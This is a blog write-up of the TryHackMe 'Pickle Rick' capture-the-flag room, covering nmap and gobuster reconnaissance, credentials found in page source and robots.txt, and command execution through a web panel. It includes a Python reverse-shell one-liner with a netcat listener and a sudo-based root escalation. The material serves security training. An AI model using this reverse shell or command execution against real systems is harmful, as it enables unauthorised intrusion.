---
title: Write-up — Pickle Rick
date: 2025-06-22 05:00:00 PM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf]
image: 'assets/img/articles/PickleRick.png'
description: Discover a comprehensive walkthrough of the 'Pickle Rick' CTF challenge on TryHackMe. This guide covers essential techniques such as initial reconnaissance, web exploitation, and privilege escalation. Ideal for cybersecurity professionals and ethical hackers aiming to enhance their skills. Dive into our detailed guide and master the challenge today!

---

> Walkthrough of room Pickle Rick from TryHackMe :
> [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

---

## Reconnaissance

### Nmap scan
```bash
nmap -sV -sC $TARGET                    # Where TARGET is 10.10.19.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-22 19:15 CEST
Nmap scan report for 10.10.19.240
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:b4:0c:ed:81:7d:00:74:f7:8d:79:48:54:c3:da:8a (RSA)
|   256 c6:71:69:9a:79:5f:dc:97:aa:f5:6a:4c:77:cc:40:fc (ECDSA)
|_  256 5f:35:e0:51:95:0c:60:f9:89:3d:55:35:ff:07:7e:09 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds
```

2 open ports:
- HTTP on port 80 running *Apache httpd 2.4.41 ((Ubuntu))* 
- SSH on port 22

While investigating the Web service, we can launch an enumeration using **`gobuster`**.

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
```
### CVE on Apache HTTP Server 2.4.41

> In Apache HTTP Server 2.4.0 to 2.4.41, redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an an unexpected URL within the request URL.
> *source:* https://vuldb.com/?id.152664

Not sure, it helps me to retrieve the ingredient Rick needs ON the server.
(Useful for phishing purpose)

### What the website looks like?

![Web page](assets/img/2025-06-22-THM-Pickle_Rick/web_page.png){: w="600"}
_Mission: Help Rick!_

There's a message:

```message
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

And if we go under the ground ?

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

We got an **username** `R1ckRul3s` and a repository called `assets/`.

![assets directory](assets/img/2025-06-22-THM-Pickle_Rick/assets.png){: w="600"}
_List of files in 'assets' directory_

Since there are unseen images in the `assets/` repository, may be there is a other pages where they are showed.

---

## Enumeration

I launched two scans in parallels.

```bash
# To catch anything
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
```

```bash
# Much more faster
gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

I think we got something.

![enum1](assets/img/2025-06-22-THM-Pickle_Rick/enum1.png){: w="600"}
_Comprehensive enumeration_

We found a `login.php` page but we still need a password.

![login page](assets/img/2025-06-22-THM-Pickle_Rick/login.png){: w="600"}
_Login page_

I launch a much fast enumeration in parallel without the extensions and on a shorter wordlist and I found an `/robots.txt` file containing the text `Wubbalubbadubdub`.

![web page](assets/img/2025-06-22-THM-Pickle_Rick/enum2.png){: w="600"}
_Fast enumeration_

Knowing Rick I think it should be the password of an old drunk man 🤣

![robots.txt](assets/img/2025-06-22-THM-Pickle_Rick/robots.png){: w="600"}
_'robots.txt' file content_

### The portal

This is the Rick portal, it help us to execute a command on the web server.

![Command Panel](assets/img/2025-06-22-THM-Pickle_Rick/command_panel.png){: w="600"}
_Command Panel page_

The other links in the navigation bar lead to `/denied.php` page. 

![access denied](assets/img/2025-06-22-THM-Pickle_Rick/denied.png){: w="600"}
_denied.php page_

In the source code of `portal.php` we can found the following string `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==` that looks like a base64 encoded string BUT NO.

**THIS STRING MEANS NOTHING!!!!!!!!!! 🤬** (a kind of troll)

---

## Exploitation
### First ingredient

By running `ls -la` on the command panel, we can find a valuable information.

```bash
# Output of the command

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

- and a file called **`Sup3rS3cretPickl3Ingred.txt`** on the current directory. That means it accessible from navigator.
- (I also discovered we can use `cat` "to make it hard for future PICKLEEEE RICCCKKKK" 😑)

So we got the first ingredient by accessing **`http://http://target_url/Sup3rS3cretPickl3Ingred.txt`**.

### Second ingredient

In order to simplify our exploration, we can set a reverse shell (my favorite part don't ask me why).

On our machine execute the command:
```bash
nc -vlnp 1234
```

On the command panel execute this one:
```bash
# Don't forget to modify by adding your IP address
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

And voila! We got a shell on our terminal (we can execute cat by the way).

The second ingredient is located at **`/home/rick/second ingredient`**.
### Third ingredient

The `root` directory is not accessible, it should probably hide the 3rd ingredient.

```bash
www-data@ip-10-10-19-240:/home/rick$ ls /root
ls /root
ls: cannot open directory '/root': Permission denied
```

So let's check our privileges:
```bash
www-data@ip-10-10-19-240:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-19-240:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-19-240:
    (ALL) NOPASSWD: ALL
```

**" `(ALL) NOPASSWD: ALL` "**

![Really???](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExMXN0YXhlMGp1a2wybGdnbnNkb2RkOHZhbmloYnR2OXFyc21oeTF1eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oOTTyHRHj0HYY/giphy.gif){: w="500"}

We can higher our privileges by executing **`sudo bash`** and find the 3rd ingredient at **`/root/3rd.txt`**.

All flags down, mission passed.

![](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExYXhnMTYzdmhpZ2E0NThmdHU1c3ExeDhsZXpvYjNreW1jMmh2Zzl2dyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Qs0QEnugOy0xIsFkpD/giphy.gif)

Be proud of what you’ve accomplished.

> "Even garbage can become intel—hackers look everywhere."

> ― Kevin Mitnick, Former Hacker turned Security Consultant

## Comments
<script src="https://giscus.app/client.js"
        data-repo="Deomorphisme/Deomorphisme.github.io"
        data-repo-id="R_kgDONEIr-Q"
        data-category="General"
        data-category-id="DIC_kwDONEIr-c4CjomU"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
